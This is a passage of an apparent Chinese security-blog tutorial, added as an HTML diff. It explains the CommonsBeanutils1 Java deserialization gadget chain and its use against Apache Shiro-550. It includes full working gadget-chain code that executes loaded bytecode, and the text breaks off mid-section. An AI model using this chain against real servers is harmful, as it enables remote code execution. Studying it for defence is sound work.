@@ -1,0 +1,596 @@
+
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+  <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。">
+  <meta name="keywords" content="phith0n,网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python">
+  <link rel="shortcut icon" href="../static/cactus/images/favicon.ico">
+  <link rel="icon" type="image/png" href="../static/cactus/images/favicon-192x192.png" sizes="192x192">
+  <link rel="apple-touch-icon" sizes="180x180" href="../static/cactus/images/apple-touch-icon.png">
+  <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌"/>
+
+  <title>CommonsBeanutils与无commons-collections的Shiro反序列化利用 | 离别歌</title>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/5.1.3/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="../static/cactus/css/style%EF%B9%96v=20220521.css">
+  
+  <link rel="stylesheet" href="../static/cactus/css/code%EF%B9%96v=20211026.css">
+  <link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+
+</head>
+<body>
+
+
+
+  <div class="sticky">
+    <a href="#" id="menu-icon" class="menu-icon active"><i class="fa fa-bars fa-lg"></i></a>
+    <div class="menu">
+      <ul>
+        <li><a href="../index.html">主页</a></li>
+        <li><a href="javascript:history.back(-1)">返回</a></li>
+      </ul>
+      <br>
+    </div>
+    <div class="clearfix"></div>
+    <div class="info" style="position: fixed">
+      <span id="i-top" style="display: none">Back to top</span>
+      <span id="i-share" style="display: none">Share post</span>
+    </div>
+    <ul class="actions">
+      <li><a class="icon" href="#" id="back-top"><i
+          class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
+          onmouseout="$('#i-top').toggle();"></i></a></li>
+      <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true"
+                                      onmouseover="$('#i-share').toggle();"
+                                      onmouseout="$('#i-share').toggle();"
+                                      onclick="$('#share').toggleClass('hidden');return false;"></i></a></li>
+    </ul>
+    <div id="share" class="hidden">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;text=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;title=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;is_video=false&amp;description=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;title=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;title=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;title=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;title=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&amp;name=CommonsBeanutils%E4%B8%8E%E6%97%A0commons-collections%E7%9A%84Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8&amp;description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <div class="article row justify-content-center min-height">
+      <div class="col-lg-8 col-md-10 col-sm-12">
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+          <header class="post-header">
+            <h1 class="color-main h1 mb-0" itemprop="name headline">CommonsBeanutils与无commons-collections的Shiro反序列化利用</h1>
+            <div class="meta">
+              <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+                <span itemprop="name">phithon</span>
+              </span>
+
+              <div class="postdate">
+                <time datetime="2021年4月19日 20:30" itemprop="datePublished">
+                  2021 四月 19 20:30
+                </time>
+              </div>
+
+              <div class="article-tag">
+                阅读：65074
+              </div>
+
+              
+                <div class="article-tag">
+                  <i class="fa fa-bookmark"></i>
+                  <a class="tag-link" href="../sort/PENETRATION.html">网络安全</a>
+                </div>
+              
+
+              
+                <div class="article-tag">
+                  <i class="fa fa-tag"></i>
+                  
+                    <a class="tag-link" href="../tag/java%E5%AE%89%E5%85%A8.html">java安全</a>
+                  
+                </div>
+              
+            </div>
+          </header>
+          <div class="content" itemprop="articleBody">
+            <blockquote>
+<p>这是<a href="https://govuln.com/">代码审计知识星球</a>中Java安全漫谈的第十七篇文章。完整文章列表与相关代码请参考：<a href="https://github.com/phith0n/JavaThings">https://github.com/phith0n/JavaThings</a></p>
+</blockquote>
+<p>上一篇文章里，我们认识了<code>java.util.PriorityQueue</code>，它在Java中是一个优先队列，队列中每一个元素有自己的优先级。在反序列化这个对象时，为了保证队列顺序，会进行重排序的操作，而排序就涉及到大小比较，进而执行<code>java.util.Comparator</code>接口的<code>compare()</code>方法。</p>
+<p>那么，我们是否还能找到其他可以利用的<code>java.util.Comparator</code>对象呢？</p>
+<h2 id="apache-commons-beanutils"><a class="toclink" href="#apache-commons-beanutils">了解Apache Commons Beanutils</a></h2>
+<p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。</p>
+<p>关于JavaBean的说明可以参考<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">这篇文章</a>。比如，Cat是一个最简单的JavaBean类：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">final</span> <span class="kd">public</span> <span class="kd">class</span> <span class="nc">Cat</span> <span class="p">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">&quot;catalina&quot;</span><span class="p">;</span>
+
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">name</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="p">(</span><span class="n">String</span> <span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。</p>
+<p>commons-beanutils中提供了一个静态方法<code>PropertyUtils.getProperty</code>，让使用者可以直接调用任意JavaBean的getter方法，比如：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">PropertyUtils</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="k">new</span> <span class="n">Cat</span><span class="p">(),</span> <span class="s">&quot;name&quot;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>此时，commons-beanutils会自动找到name属性的getter方法，也就是<code>getName</code>，然后调用，获得返回值。除此之外，<code>PropertyUtils.getProperty</code>还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过<code>PropertyUtils.getProperty(a, "b.c");</code>的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。</p>
+<p>当然，commons-beanutils中诸如此类的辅助方法还有很多，如调用setter、拷贝属性等，本文不再细说。</p>
+<h2 id="getter"><a class="toclink" href="#getter">getter的妙用</a></h2>
+<p>回到本文主题，我们需要找可以利用的<code>java.util.Comparator</code>对象，在commons-beanutils包中就存在一个：<code>org.apache.commons.beanutils.BeanComparator</code>。</p>
+<p><code>BeanComparator</code>是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了<code>java.util.Comparator</code>接口。我们看它的compare方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">public</span> <span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span> <span class="kd">final</span> <span class="n">T</span> <span class="n">o1</span><span class="p">,</span> <span class="kd">final</span> <span class="n">T</span> <span class="n">o2</span> <span class="p">)</span> <span class="p">{</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">property</span> <span class="o">==</span> <span class="kc">null</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// compare the actual objects</span>
+        <span class="k">return</span> <span class="n">internalCompare</span><span class="p">(</span> <span class="n">o1</span><span class="p">,</span> <span class="n">o2</span> <span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">final</span> <span class="n">Object</span> <span class="n">value1</span> <span class="o">=</span> <span class="n">PropertyUtils</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span> <span class="n">o1</span><span class="p">,</span> <span class="n">property</span> <span class="p">);</span>
+        <span class="kd">final</span> <span class="n">Object</span> <span class="n">value2</span> <span class="o">=</span> <span class="n">PropertyUtils</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span> <span class="n">o2</span><span class="p">,</span> <span class="n">property</span> <span class="p">);</span>
+        <span class="k">return</span> <span class="n">internalCompare</span><span class="p">(</span> <span class="n">value1</span><span class="p">,</span> <span class="n">value2</span> <span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span> <span class="kd">final</span> <span class="n">IllegalAccessException</span> <span class="n">iae</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="p">(</span> <span class="s">&quot;IllegalAccessException: &quot;</span> <span class="o">+</span> <span class="n">iae</span><span class="p">.</span><span class="na">toString</span><span class="p">()</span> <span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span> <span class="kd">final</span> <span class="n">InvocationTargetException</span> <span class="n">ite</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="p">(</span> <span class="s">&quot;InvocationTargetException: &quot;</span> <span class="o">+</span> <span class="n">ite</span><span class="p">.</span><span class="na">toString</span><span class="p">()</span> <span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span> <span class="kd">final</span> <span class="n">NoSuchMethodException</span> <span class="n">nsme</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">RuntimeException</span><span class="p">(</span> <span class="s">&quot;NoSuchMethodException: &quot;</span> <span class="o">+</span> <span class="n">nsme</span><span class="p">.</span><span class="na">toString</span><span class="p">()</span> <span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>这个方法传入两个对象，如果<code>this.property</code>为空，则直接比较这两个对象；如果<code>this.property</code>不为空，则用<code>PropertyUtils.getProperty</code>分别取这两个对象的<code>this.property</code>属性，比较属性的值。</p>
+<p>上一节我们说了，<code>PropertyUtils.getProperty</code>这个方法会自动去调用一个JavaBean的getter方法，这个点是任意代码执行的关键。有没有什么getter方法可以执行恶意代码呢？</p>
+<p>此时回到《Java安全漫谈》第13章，其中在追踪分析<code>TemplatesImpl</code>时，有过这么一段描述：</p>
+<blockquote>
+<p>我们从<code>TransletClassLoader#defineClass()</code>向前追溯一下调用链：</p>
+<p><code>TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</code></p>
+<p>追到最前面两个方法<code>TemplatesImpl#getOutputProperties()</code>、<code>TemplatesImpl#newTransformer()</code>，这两者的作用域是public，可以被外部调用。我们尝试用<code>newTransformer()</code>构造一个简单的POC...</p>
+</blockquote>
+<p>看到这个<code>TemplatesImpl#getOutputProperties()</code>了吗？这个<code>getOutputProperties()</code>方法是调用链上的一环，它的内部调用了<code>TemplatesImpl#newTransformer()</code>，也就是我们后面常用来执行恶意字节码的方法：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">public</span> <span class="kd">synchronized</span> <span class="n">Properties</span> <span class="nf">getOutputProperties</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">newTransformer</span><span class="p">().</span><span class="na">getOutputProperties</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">catch</span> <span class="p">(</span><span class="n">TransformerConfigurationException</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>而<code>getOutputProperties</code>这个名字，是以<code>get</code>开头，正符合getter的定义。</p>
+<p>所以，<code>PropertyUtils.getProperty( o1, property )</code>这段代码，当o1是一个<code>TemplatesImpl</code>对象，而<code>property</code>的值为<code>outputProperties</code>时，将会自动调用getter，也就是<code>TemplatesImpl#getOutputProperties()</code>方法，触发代码执行。</p>
+<h2 id="_1"><a class="toclink" href="#_1">反序列化利用链构造</a></h2>
+<p>了解了原理，我们来构造利用链。</p>
+<p>首先还是创建TemplateImpl：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="p">();</span>
+<span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_bytecodes&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span>
+    <span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">evil</span><span class="p">.</span><span class="na">EvilTemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()).</span><span class="na">toBytecode</span><span class="p">()</span>
+<span class="p">});</span>
+<span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_name&quot;</span><span class="p">,</span> <span class="s">&quot;HelloTemplatesImpl&quot;</span><span class="p">);</span>
+<span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_tfactory&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="p">());</span>
+</code></pre></div>
+
+<p>然后，我们实例化本篇讲的<code>BeanComparator</code>。<code>BeanComparator</code>构造函数为空时，默认的<code>property</code>就是空：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">final</span> <span class="n">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="p">();</span>
+</code></pre></div>
+
+<p>然后用这个comparator实例化优先队列<code>PriorityQueue</code>：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">final</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">comparator</span><span class="p">);</span>
+<span class="c1">// stub data for replacement later</span>
+<span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div>
+
+<p>可见，我们添加了两个无害的可以比较的对象进队列中。前文说过，<code>BeanComparator#compare()</code>中，如果<code>this.property</code>为空，则直接比较这两个对象。这里实际上就是对两个<code>1</code>进行排序。</p>
+<p>初始化时使用正经对象，且<code>property</code>为空，这一系列操作是为了初始化的时候不要出错。然后，我们再用反射将<code>property</code>的值设置成恶意的<code>outputProperties</code>，将队列里的两个1替换成恶意的<code>TemplateImpl</code>对象：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span> <span class="s">&quot;property&quot;</span><span class="p">,</span> <span class="s">&quot;outputProperties&quot;</span><span class="p">);</span>
+<span class="n">setFieldValue</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span> <span class="s">&quot;queue&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">obj</span><span class="p">,</span> <span class="n">obj</span><span class="p">});</span>
+</code></pre></div>
+
+<p>最后完成整个CommonsBeanutils1利用链：</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">package</span> <span class="nn">com.govuln.deserialization</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonsBeanutils1</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="p">,</span> <span class="n">Object</span> <span class="n">value</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">fieldName</span><span class="p">);</span>
+        <span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">field</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">TemplatesImpl</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="p">();</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_bytecodes&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span>
+                <span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">evil</span><span class="p">.</span><span class="na">EvilTemplatesImpl</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()).</span><span class="na">toBytecode</span><span class="p">()</span>
+        <span class="p">});</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_name&quot;</span><span class="p">,</span> <span class="s">&quot;HelloTemplatesImpl&quot;</span><span class="p">);</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="s">&quot;_tfactory&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="p">());</span>
+
+        <span class="kd">final</span> <span class="n">BeanComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BeanComparator</span><span class="p">();</span>
+        <span class="kd">final</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">comparator</span><span class="p">);</span>
+        <span class="c1">// stub data for replacement later</span>
+        <span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">comparator</span><span class="p">,</span> <span class="s">&quot;property&quot;</span><span class="p">,</span> <span class="s">&quot;outputProperties&quot;</span><span class="p">);</span>
+        <span class="n">setFieldValue</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span> <span class="s">&quot;queue&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="n">obj</span><span class="p">,</span> <span class="n">obj</span><span class="p">});</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="p">(</span><span class="n">Object</span><span class="p">)</span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>成功弹出计算器：</p>
+<p><a href="../media/attachment/2021/04/19/3f151339-ddb5-4618-b18b-9bad34861681.png"><img alt="image-20210403035315936.png" src="../media/attachment/2021/04/19/3f151339-ddb5-4618-b18b-9bad34861681.38ca8aa17421.png" /></a></p>
+<p>相比于ysoserial里的CommonsBeanutils1利用链，本文的利用链去掉了对<code>java.math.BigInteger</code>的使用，因为ysoserial为了兼容<code>property=lowestSetBit</code>，但实际上我们将<code>property</code>设置为null即可。</p>
+<h2 id="shiro-550"><a class="toclink" href="#shiro-550">Shiro-550利用的难点</a></h2>
+<p>还记得Shiro反序列化漏洞吗？我们用IDE打开之前我写的Shiro最简单的例子<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">shirodemo</a>。我曾说这个demo中我添加了几个依赖库：</p>
+<ol>
+<li>
+<p>shiro-core、shiro-web，这是shiro本身的依赖</p>
+</li>
+<li>
+<p>javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖</p>
+</li>
+<li>
+<p>slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖</p>
+</li>
+<li>
+<p>commons-logging，这是shiro中用到的一个接口，不添加会爆<code>java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory</code>错误</p>
+</li>
+<li>
+<p>commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖</p>
+</li>
+</ol>
+<p>前4个依赖都和项目本身有关，少了他们这个demo会出错或功能缺失。但是第5个依赖，commons-collections主要是为了演示漏洞。那么，<strong>实际场景下，目标可能并没有安装commons-collections，这个时候shiro反序列化漏洞是否仍然可以利用呢？</strong></p>
+<p>我们将pom.xml中关于commons-collections的部分删除，重新加载Maven，此时观察IDEA中的依赖库：</p>
+<p><a href="../media/attachment/2021/04/19/c13b4385-5305-42b2-b202-51aa6b5c3b99.png"><img alt="image-20210403041200333.png" src="../media/attachment/2021/04/19/c13b4385-5305-42b2-b202-51aa6b5c3b99.97ee5cceb03c.png" /></a></p>
+<p>commons-beanutils赫然在列。</p>
+<p>也就是说，Shiro是依赖于commons-beanutils的。那么，是否可以用到本文讲的CommonsBeanutils1利用链呢？</p>
+<p>尝试生成一个Payload发送，并没有成功，此时在Tomcat的控制台可以看到报错信息：</p>
+<p><a href="../media/attachment/2021/04/19/0ed0072d-313e-4249-9d60-190bd1f09fc0.png"><img alt="image-20210403043132139.png" src="../media/attachment/2021/04/19/0ed0072d-313e-4249-9d60-190bd1f09fc0.84cf8ea3e8ab.png" /></a></p>
+<blockquote>
+<p>org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</p>
+</blockquote>
+<p>这个错误是什么意思？</p>
+<h3 id="serialversionuid"><a class="toclink" href="#serialversionuid">serialVersionUID是什么？</a></h3>
+<p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的<code>serialVersionUID</code>值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的<code>serialVersionUID</code>不同，则反序列化就会异常退出，避免后续的未知隐患。</p>
+<p>当然，开发者也可以手工给类赋予一个<code>serialVersionUID</code>值，此时就能手工控制兼容性了。</p>
+<p>所以，出现错误的原因就是，本地使用的commons-beanutils是1.9.2版本，而Shiro中自带的commons-beanutils是1.8.3版本，出现了<code>serialVersionUID</code>对应不上的问题。</p>
+<p>解决方法也比较简单，将本地的commons-beanutils也换成1.8.3版本。</p>
+<p>更换版本后，再次生成Payload进行测试，此时Tomcat端爆出了另一个异常，仍然没有触发代码执行：</p>
+<p><a href="../media/attachment/2021/04/19/008fa174-a37b-4cc1-95a8-fb5f67673669.png"><img alt="image-20210403044253628.png" src="../media/attachment/2021/04/19/008fa174-a37b-4cc1-95a8-fb5f67673669.ef6706101c6b.png" /></a></p>
+<blockquote>
